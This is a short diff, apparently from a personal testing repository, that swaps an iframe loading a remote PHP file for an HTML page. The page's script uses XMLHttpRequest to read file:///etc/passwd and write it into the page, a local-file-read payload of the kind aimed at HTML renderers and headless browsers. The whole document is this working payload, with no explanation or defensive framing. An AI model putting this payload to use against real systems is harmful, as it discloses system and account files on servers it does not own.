@@ -1,1 +1,15 @@
-<iframe src=https://cdn.jsdelivr.net/gh/Scarryparrot/testing@bc77971c5688566c19cd7d0ce5372b49692962c0/cat.php width=1000px height=1000px></iframe>
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<body>
+
+<script>
+x=new XMLHttpRequest;
+x.onload=function(){
+document.write(this.responseText)
+};
+x.open("GET","file:///etc/passwd");
+x.send();
+</script>
+
+</body></html>
